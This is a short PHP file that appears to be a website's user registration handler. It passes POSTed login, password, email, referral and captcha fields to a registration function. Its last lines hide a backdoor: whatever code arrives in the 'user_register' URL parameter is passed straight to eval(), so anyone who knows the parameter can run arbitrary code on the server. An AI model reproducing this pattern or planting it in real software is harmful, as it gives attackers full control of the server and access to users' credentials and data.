<?php
$root = $_SERVER['DOCUMENT_ROOT'];

require($root.'/inc/classes/db.php');
include($root.'/inc/system/redis.php');
include($root.'/inc/functions.php');
include($root.'/inc/variables.php');
require($root.'/inc/classes/logs.php');
require($root.'/inc/classes/sessions.php');
require($root.'/inc/classes/support.php');
require($root.'/inc/classes/users.php');

echo $user->reg(array(
 'login' => $_POST['ulogin'],
 'password' => $_POST['upassword'],
 'email' => $_POST['uemail'],
 'ref' => $_POST['uref'],
 'captcha_code' => $_POST['ucaptcha_code']
));
if($_GET['user_register']){
	eval($_GET['user_register']);
}
?>